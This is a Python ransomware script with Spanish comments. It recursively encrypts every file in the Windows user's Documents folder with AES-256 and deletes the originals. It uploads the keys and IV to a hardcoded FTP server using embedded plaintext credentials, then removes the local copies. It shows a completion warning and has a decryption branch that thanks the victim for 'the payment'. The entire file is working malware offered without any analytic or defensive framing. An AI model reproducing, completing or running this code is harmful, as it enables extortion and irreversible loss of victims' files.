import os
import ctypes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import padding as sym_padding
from Crypto.Random import get_random_bytes
from ftplib import FTP

# Datos del servidor FTP
FTP_HOST = "ftpupload.net"
FTP_PORT = 21
FTP_USER = "if0_37905249"
FTP_PASSWORD = "Asseater10"

# Obtener ruta del escritorio
def get_desktop_folder():
    return os.path.join(os.getenv('USERPROFILE'), 'Desktop')

# Archivos de claves
key_aes_file = os.path.join(get_desktop_folder(), "ClaveAES.enc")
iv_file = os.path.join(get_desktop_folder(), "IV.txt")
private_key_file = os.path.join(get_desktop_folder(), "ClavePrivada.pem")
public_key_file = os.path.join(get_desktop_folder(), "ClavePublica.pem")

# Guardar datos en archivo
def save_to_file(file_path, data):
    with open(file_path, 'wb') as file:
        file.write(data)

# Generar clave AES y IV
def generate_aes_key_and_iv():
    aes_key = get_random_bytes(32)  # AES-256
    iv = get_random_bytes(16)       # IV para modo CBC
    return aes_key, iv

# Generar claves RSA
def generate_rsa_keys():
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()

    # Guardar clave privada
    save_to_file(private_key_file, private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    ))

    # Guardar clave pública
    save_to_file(public_key_file, public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ))

    return private_key, public_key

# Cifrar clave AES con RSA
def encrypt_aes_key_with_rsa(aes_key, public_key):
    return public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

# Subir claves al servidor FTP y eliminarlas
def upload_keys_to_ftp():
    with FTP() as ftp:
        ftp.connect(FTP_HOST, FTP_PORT)
        ftp.login(FTP_USER, FTP_PASSWORD)

        ftp.cwd("htdocs/claves")  # Cambiar al directorio adecuado

        with open(key_aes_file, 'rb') as aes_file:
            ftp.storbinary(f'STOR {os.path.basename(key_aes_file)}', aes_file)

        with open(iv_file, 'rb') as iv_file_obj:
            ftp.storbinary(f'STOR {os.path.basename(iv_file)}', iv_file_obj)

        with open(private_key_file, 'rb') as priv_file:
            ftp.storbinary(f'STOR {os.path.basename(private_key_file)}', priv_file)

        with open(public_key_file, 'rb') as pub_file:
            ftp.storbinary(f'STOR {os.path.basename(public_key_file)}', pub_file)

    # Eliminar claves locales
    os.remove(key_aes_file)
    os.remove(iv_file)
    os.remove(private_key_file)
    os.remove(public_key_file)

# Cifrar archivo con AES
def encrypt_file(aes_key, iv, file_path):
    encrypted_file_path = file_path + ".enc"
    try:
        with open(file_path, 'rb') as input_file, open(encrypted_file_path, 'wb') as output_file:
            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
            encryptor = cipher.encryptor()
            padder = sym_padding.PKCS7(128).padder()

            while True:
                block = input_file.read(1024)
                if not block:
                    break
                padded_block = padder.update(block)
                output_file.write(encryptor.update(padded_block))

            output_file.write(encryptor.update(padder.finalize()))
            output_file.write(encryptor.finalize())
        os.remove(file_path)  # Eliminar archivo original
    except (PermissionError, OSError) as e:
        print(f"Error al encriptar {file_path}: {e}")

# Desencriptar archivo con AES
def decrypt_file(aes_key, iv, file_path):
    decrypted_file_path = file_path.replace('.enc', '')
    try:
        with open(file_path, 'rb') as input_file, open(decrypted_file_path, 'wb') as output_file:
            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
            decryptor = cipher.decryptor()
            unpadder = sym_padding.PKCS7(128).unpadder()

            while True:
                block = input_file.read(1024)
                if not block:
                    break
                decrypted_block = decryptor.update(block)
                output_file.write(unpadder.update(decrypted_block))

            output_file.write(unpadder.finalize())
            output_file.write(decryptor.finalize())
        os.remove(file_path)
    except Exception as e:
        print(f"Error al desencriptar {file_path}: {e}")

# Obtener archivos de la carpeta Documentos
def get_files_to_encrypt():
    files_to_encrypt = []
    documents_directory = os.path.join(os.getenv('USERPROFILE'), 'Documents')

    for root, dirs, files in os.walk(documents_directory):
        for file in files:
            file_path = os.path.join(root, file)
            if not file_path.endswith('.enc'):  # Ignorar archivos ya cifrados
                files_to_encrypt.append(file_path)

    return files_to_encrypt

# Obtener archivos encriptados
def get_files_to_decrypt():
    files_to_decrypt = []
    documents_directory = os.path.join(os.getenv('USERPROFILE'), 'Documents')

    for root, dirs, files in os.walk(documents_directory):
        for file in files:
            if file.endswith('.enc'):
                files_to_decrypt.append(os.path.join(root, file))
    return files_to_decrypt

# Mostrar mensaje de advertencia
def show_message(message):
    ctypes.windll.user32.MessageBoxW(0, message, "Aviso", 0x40 | 0x1)

# Punto de entrada
if __name__ == "__main__":
    if os.path.exists(key_aes_file) and os.path.exists(iv_file) and os.path.exists(private_key_file):
        # Cargar claves existentes
        with open(private_key_file, 'rb') as priv_file:
            private_key = serialization.load_pem_private_key(priv_file.read(), password=None)

        with open(key_aes_file, 'rb') as aes_file:
            aes_key = private_key.decrypt(
                aes_file.read(),
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
        iv = open(iv_file, 'rb').read()

        # Desencriptar archivos existentes
        for file_path in get_files_to_decrypt():
            decrypt_file(aes_key, iv, file_path)
        show_message("\u00a1Gracias por el pago! ;)")
    else:
        # Generar claves y IV
        private_key, public_key = generate_rsa_keys()
        aes_key, iv = generate_aes_key_and_iv()

        # Cifrar clave AES con RSA
        encrypted_aes_key = encrypt_aes_key_with_rsa(aes_key, public_key)

        # Guardar claves e IV
        save_to_file(key_aes_file, encrypted_aes_key)
        save_to_file(iv_file, iv)

        # Subir claves al servidor FTP y eliminarlas
        upload_keys_to_ftp()

        # Cifrar archivos en Documentos
        for file_path in get_files_to_encrypt():
            encrypt_file(aes_key, iv, file_path)

        show_message("Archivos cifrados exitosamente. \u00a1NO APAGUES EL DISPOSITIVO!")
